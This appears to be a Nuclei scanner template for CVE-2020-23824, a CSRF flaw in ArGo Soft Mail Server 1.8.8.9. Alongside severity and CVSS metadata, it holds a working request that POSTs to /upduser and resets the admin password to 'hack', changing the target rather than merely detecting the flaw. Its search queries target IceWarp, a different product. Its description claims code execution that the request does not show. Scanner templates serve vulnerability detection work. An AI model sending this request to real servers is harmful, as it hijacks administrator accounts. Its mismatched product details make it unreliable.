id: CVE-2020-23824

info:
  name: CSRF Vulnerability in ArGo Soft Mail Server 1.8.8.9
  author: ProjectDiscoveryAI
  severity: high
  description: ArGo Soft Mail Server 1.8.8.9 is vulnerable to CSRF which allows remote attackers to perform arbitrary code execution via the Administration dashboard.
  impact: |
    Successful exploitation could lead to unauthorized actions being performed by attackers on behalf of authenticated users.
  remediation: |
    Upgrade ArGo Soft Mail Server to a patched version to mitigate the CSRF vulnerability (CVE-2020-23824).
  reference:
    - https://github.com/404notf0und/CVE-Flow
    - https://github.com/V1n1v131r4/My-CVEs
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H
    cvss-score: 8.8
    cve-id: CVE-2020-23824
    cwe-id: CWE-352
    epss-score: 0.00429
    epss-percentile: 0.75188
    cpe: cpe:2.3:a:argosoft:mail_server:1.8.8.9:*:*:*:*:*:*:*
  metadata:
    vendor: argosoft
    product: mail_server
    shodan-query: http.title:"IceWarp Server Administration"
    fofa-query:
      - title="icewarp server administration"
      - title="icewarp"
    google-query:
      - intitle:"icewarp server administration"
      - intitle:"icewarp"
      - powered by icewarp 10.4.4

http:
  - method: POST
    path:
      - "{{BaseURL}}/upduser"

    body: |
      realname=admin&password=hack&confirmpassword=hack&forwardaddress=&keepcopies=N&returnaddress=&fingerinfo=&respondersubject=&responderdata=

    headers:
      Content-Type: application/x-www-form-urlencoded
    matchers:
      - type: word
        words:
          - "User information updated successfully"
        part: body
